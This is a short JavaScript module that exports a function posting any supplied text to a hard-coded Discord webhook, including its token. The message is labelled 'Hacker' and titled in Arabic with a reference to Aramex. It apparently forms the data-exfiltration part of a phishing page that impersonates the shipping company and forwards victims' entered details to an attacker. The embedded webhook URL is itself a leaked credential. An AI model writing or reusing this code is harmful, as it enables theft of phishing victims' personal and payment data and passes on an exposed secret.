import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325058180949999646/G-mXsNgjSvbzGuVf4zMRaaMev6tCxUnZhc998POjnDu_AEa6SXICyeuuFCGx5kH2jxnU",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
